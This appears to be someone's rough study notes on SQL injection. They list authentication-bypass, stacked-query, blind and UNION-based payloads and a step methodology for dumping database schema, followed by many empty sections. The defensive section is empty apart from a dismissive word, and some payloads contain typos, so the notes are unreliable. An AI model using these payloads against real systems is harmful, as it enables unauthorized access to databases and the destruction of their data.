## SQL
```

Structured query language:
(MYSQL)

Eveything is case sensitive except databases/tables
Databases contain tables
tables contain columns
information, preformance, mysql == default

select * from messages.comments;

SQL sanitization


```

## SQL INJECTION
```
Authentication bypass
TOM' OR 1='1 (username and password)

Stacking Statements
Select * From user Where id='JOHNNY; DROM TABLE CUSTOMERS; #'

Add an # at end of every statement except the test statement

GOLDEN STATEMENT:
Injectable field that is NOT A LOGIN FIELD

Blind Injection:
Normal query -- php?item=4
Blind injection: php?item=4 OR 1=1


@@Version in a column gives you version


Defending against:
TRASH

```

## DEMO
```

' OR 1='1 (username and password)

TURN POST INTO A GET REQUEST
open network tab (F12)
send authentication and look at varriables
click raw
copy
add an ? and paste
you can only pull usernames and passwords/authentication bypass on a login screen

GOLDEN STATEMENT:


```

## Methodology
```

Login == SQL
TABLE == SQL
When given options, use them

0. Find SQL FIELD
1. TEST FIELD
2. FIND COLUMNS(Union Select 1,2,3,4,5....)
3. GOLDEN STATEMENT (UNION SELECT table_schema,table_name,Column_name FROM information_schema.columns;#)(pad according to what you see)
4. Line up
5. BASK IN GLORY
6. Profit

USE THE GOLDEN STATEMENT TO CRAFT THE NEXT QUERY

```

## 
```



```

## 
```



```

## 
```



```

## 
```



```

## 
```



```

## 
```



```

## 
```



```

## 
```



```

## 
```



```

## 
```



```

## 
```



```

## 
```



```

## 
```



```

## 
```



```

## 
```



```

## 
```



```

## 
```



```

## 
```



```

